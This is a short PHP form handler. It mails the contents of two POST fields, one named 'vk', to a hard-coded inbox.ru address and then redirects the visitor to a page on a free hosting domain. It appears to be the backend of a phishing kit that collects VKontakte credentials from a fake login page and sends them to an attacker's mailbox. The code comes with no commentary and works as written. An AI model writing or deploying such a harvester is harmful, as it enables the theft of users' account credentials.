<?php
  $to = "aaa.avy@inbox.ru";
  $subject = $_POST['vk'];
  $message = $_POST['send'];
  mail ($to, $subject, $message);
  header("Location: http://f0449853.xsph.ru/index.html");
  exit;
?>